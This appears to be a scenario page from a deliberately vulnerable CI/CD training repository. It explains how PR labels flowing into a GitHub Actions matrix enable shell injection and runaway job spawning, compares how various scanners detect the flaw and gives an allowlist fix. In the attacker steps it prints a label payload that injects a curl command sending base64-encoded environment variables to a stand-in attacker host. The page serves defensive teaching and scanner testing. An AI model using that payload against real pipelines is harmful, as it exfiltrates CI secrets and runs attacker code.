# Scenario 21: Matrix expansion injection

**OWASP CICD-SEC mapping:** CICD-SEC-4 (Poisoned Pipeline Execution)

**Vulnerable workflow:** [`.github/workflows/scenario-21-matrix-expansion-injection.yml`](../../.github/workflows/scenario-21-matrix-expansion-injection.yml)

## The pattern

GitHub Actions evaluates `strategy.matrix` at job-launch time, expanding
each entry into a separate job. If the matrix values come from PR
metadata — `pull_request.labels`, `pull_request.head.ref`,
`pull_request.title`, or anything piped through `fromJSON()` from a
prior job's output that derived from PR input — the attacker controls:

1. **The job count.** Inject an array with thousands of entries; GHA
   spawns thousands of jobs. Runner cost-bomb at minimum, DoS of the
   queue at worst.
2. **The job names.** Names appear in run summaries, check-suite
   contexts, and webhook payloads; downstream automation that branches
   on the name can be tricked.
3. **The shell context downstream.** Any `${{ matrix.foo }}` in a
   `run:` block is direct expression injection — Scenario 02's bug,
   but transitively through the matrix.

## How an attacker exploits it

1. Open a fork PR.
2. Wait for a maintainer to add a label (or, on repos that allow it,
   add a label yourself). The label name is the payload:
   ```
   ); curl -d "$(env|base64)" attacker.tld; #
   ```
3. The `prepare` job exposes labels via `toJSON(...) → $GITHUB_OUTPUT`.
4. The `build` job expands the matrix from those labels. The
   `matrix.target` value is your injection string.
5. The `run: make build TARGET="${{ matrix.target }}"` step splices
   your payload into bash before bash sees it. RCE under the
   workflow's privileges.

## Expected scanner coverage

| Scanner            | Detection                                                              |
| :----------------- | :--------------------------------------------------------------------- |
| **pipeline-check** | ✅ `TAINT-002` traces the full chain: `env:` binding -> `$GITHUB_OUTPUT` write -> `jobs.<id>.outputs:` -> `fromJSON(needs.X.outputs.Y)` matrix axis -> `${{ matrix.<axis> }}` sink |
| zizmor             | ✅ `template-injection` fires on the downstream `matrix.target` use   |
| poutine            | ⚠️ Partial — flags PR-derived job outputs                              |
| KICS               | ❌                                                                     |
| Checkov            | ❌                                                                     |
| Trivy              | ❌                                                                     |
| Gitleaks           | —                                                                      |

> This is one of the harder scenarios to catch cleanly because the
> taint flow crosses a job boundary via `outputs:`. Scanners that do
> intra-step analysis miss it; scanners that do whole-workflow taint
> tracking catch it.

## Fix

Restrict the matrix to a known allowlist, or fail closed when the
input doesn't match it:

```yaml
- id: set
  env:
    LABELS: ${{ toJSON(github.event.pull_request.labels.*.name) }}
  run: |
    safe=$(jq -c '[.[] | select(. as $l | ["linux","mac","windows"] | index($l))]' <<<"$LABELS")
    echo "targets=$safe" >> "$GITHUB_OUTPUT"
```

And in the downstream step, use the matrix value via env rather than
direct expression interpolation:

```yaml
- env:
    TARGET: ${{ matrix.target }}
  run: make build TARGET="$TARGET"
```

## References

- GitHub Security Lab — Matrix taint:
  https://securitylab.github.com/research/github-actions-untrusted-input/
- zizmor — `template-injection`:
  https://docs.zizmor.sh/audits/#template-injection
